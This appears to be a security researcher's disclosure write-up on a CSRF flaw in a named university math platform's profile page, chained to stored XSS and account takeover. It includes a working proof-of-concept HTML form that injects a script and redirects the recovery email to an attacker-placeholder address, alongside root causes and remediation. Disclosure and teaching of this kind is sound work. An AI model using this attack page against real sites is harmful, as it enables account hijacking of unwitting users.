---
title: "CSRF to Stored XSS to Account Takeover on ChildsMath"
date: 2026-02-12
tags: ["csrf", "xss", "stored-xss", "ato", "account-takeover", "web", "childsmath"]
summary: "A CSRF vulnerability on ChildsMath's profile update endpoint that enabled stored XSS via unsanitized name fields — the injected script persisted across every page in the application, and the same request could change the recovery email to execute a full account takeover."
---

## Target Context

[ChildsMath](https://www.childsmath.ca) is a PHP-based academic math platform used by McMaster University students. Students log in either with their institutional Microsoft accounts or with standalone non-McMaster credentials. The platform manages grades, assignments, and student account settings.

This report focuses on the profile update page (`account.php`), which is only accessible to non-McMaster accounts. McMaster accounts authenticate through SSO and have a different profile flow. The `account.php` endpoint handles things like name, recovery email, and other basic account fields.

---

## How I Found It

I was already looking at the platform's CSRF posture (see my other post on the marks.php issue). The natural next thing to check was every other form that does something sensitive. Profile updates are always worth examining — they're often written once early in a project and never revisited for security.

I logged into a non-McMaster test account, navigated to the profile page, and updated my name while Burp was intercepting. The outgoing request:

```
POST /childsmath/account.php HTTP/1.1
Host: www.childsmath.ca
Content-Type: multipart/form-data

surname=Doe
given_name=John
email=myemail@test.com
macid__hidden=victim@test.com
ff_submit=Save
```

No CSRF token. No custom headers. No re-authentication prompt.

Same CSRF surface as the marks endpoint — the browser would send the session cookie with any cross-site POST, and since the cookie didn't have an explicit SameSite attribute, the 2-minute window applied here as well (though on Firefox and Safari it wasn't needed at all).

So the CSRF was there. But then I looked at what those fields actually did when the server processed them.

---

## The XSS

The `surname` and `given_name` fields are stored in the database and reflected back into the page. Specifically, they show up in the navigation bar — the persistent header element that appears on *every page* of the application after login.

I asked myself the obvious question: is the output encoded?

I crafted a test payload and submitted it via a forged form. The `given_name` value:

```
John<script>alert(3.14159);</script>
```

Reloaded the page. The alert fired.

Then on the next page load — the alert fired again. And again. Because the name is displayed in the navbar on every route in the application, any JavaScript injected into that field executes on every single page the victim visits, indefinitely, until the field is overwritten.

This is stored XSS. It doesn't require the victim to visit any specific URL. It's baked into their account.

The stealth angle here is notable: the `<script>` tag isn't rendered as visible text in the navbar. A victim sees "John" as their display name. The injected script is invisible in the UI. The only way they'd know something was wrong is by checking the page source or visiting their profile settings page.

---

## The Full Attack Chain

Combining CSRF with stored XSS with email takeover in a single request:

```html
<!DOCTYPE html>
<html>
<head><title>Click to continue</title></head>
<body>
<button id="start">Click to start</button>

<form id="csrfForm"
  action="https://www.childsmath.ca/childsmath/account.php"
  method="POST"
  enctype="multipart/form-data"
  style="display:none">
  <input type="hidden" name="surname" value="Doe">
  <input type="hidden" name="given_name" value='John<script>alert(3.14159);</script>'>
  <input type="hidden" name="macid__hidden" value="victim@target.com">
  <input type="hidden" name="email" value="hacker@attacker.com">
  <input type="hidden" name="ff_submit" value="Save">
</form>

<script>
document.getElementById('start').onclick = function() {
  document.getElementById('csrfForm').submit();
};
</script>
</body>
</html>
```

One form submission does three things:

1. **Injects stored XSS** into the victim's `given_name` field. The payload executes on every subsequent page load.
2. **Changes the recovery email** to `hacker@attacker.com`. The attacker can now trigger a password reset and receive the link in their own inbox.
3. **Locks the victim out** once the attacker completes the password reset.

The whole initial delivery can be done through a 1x1 pixel popup window — it opens, submits the form, and closes in under a second. The victim might see a brief flash of a window, or nothing at all, depending on the browser.

---

## Why Stored XSS in the Navbar is Particularly Bad

Stored XSS in a navbar is one of the more impactful placements possible. Most XSS is scoped — it triggers on a specific page that the victim has to be induced to visit. Navbar XSS is different:

- **Persistent.** It runs on every page, including any sensitive pages like grade views, assignment submissions, or account settings.
- **Silent.** The victim has no idea it's there from looking at the page.
- **Self-propagating potential.** A script in the navbar can make fetch requests, read other form fields, exfiltrate data, or — in the right context — replicate itself by performing the same profile update on other users.

In an academic context, where students are logged in for entire study sessions clicking through many pages, this persistence window is large.

---

## Root Causes

**Missing anti-CSRF tokens.** The `account.php` endpoint accepts POST requests and modifies sensitive account data without verifying that the request originated from within the application. A token in the form, validated server-side, would stop the CSRF entirely.

**No output encoding.** The `surname` and `given_name` values are written directly into the HTML without sanitization. Characters like `<`, `>`, and `"` need to be HTML-encoded before being placed in page output. In PHP, `htmlspecialchars()` exists for exactly this. It wasn't being used.

These two bugs independently are significant. Together, they chain into something worse: the CSRF delivers the XSS payload and the email change simultaneously in a single interaction.

---

## Remediation

**1. Anti-CSRF tokens.** Generate a server-side token per session, embed it in all profile update forms as a hidden field, and reject any POST that doesn't include a valid matching token. This is table-stakes web security and libraries/frameworks handle it automatically if you let them.

**2. Output encoding.** Every user-supplied string that gets placed into HTML output must be encoded in context. For PHP, `htmlspecialchars($value, ENT_QUOTES, 'UTF-8')` on output, or a templating engine that escapes by default. The surname and given_name fields are the clear vectors here, but audit all user-controllable values in rendered output.

**3. Re-authentication for sensitive changes.** Changing the recovery email should require entering the current password. Even if CSRF protection is somehow bypassed, the attacker doesn't know the victim's password — this would stop the account takeover leg of the attack.

---

## Disclosure

Reported to the platform administrators alongside the marks.php CSRF issue. Both vulnerabilities were reported on the same date.
